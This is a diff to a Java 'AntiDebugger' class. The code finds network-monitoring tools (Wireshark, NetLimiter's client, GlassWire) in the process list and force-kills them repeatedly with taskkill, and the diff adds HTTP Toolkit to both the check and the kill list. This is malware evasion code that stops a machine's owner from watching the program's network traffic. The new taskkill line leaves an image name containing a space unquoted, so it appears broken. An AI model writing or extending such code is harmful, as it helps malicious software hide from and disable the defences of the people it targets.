@@ -25,12 +25,13 @@ public class AntiDebugger {
                 // empty catch block
             }
 
-            if (builder.toString().contains("wireshark") || builder.toString().contains("NLClientApp") || builder.toString().contains("GlassWire")) {
+            if (builder.toString().contains("wireshark") || builder.toString().contains("NLClientApp") || builder.toString().contains("GlassWire") || builder.toString().contains("HTTP ToolKit")) {
                 for (int i = 0; i < 200; ++i) {
                     try {
                         Runtime.getRuntime().exec("taskkill /IM wireshark.exe /F");
                         Runtime.getRuntime().exec("taskkill /IM NLClientApp.exe /F");
                         Runtime.getRuntime().exec("taskkill /IM GlassWire.exe /F");
+						Runtime.getRuntime().exec("taskkill /IM HTTP ToolKit.exe /F");
                     } catch (IOException e) {
                         // empty catch block
                     }
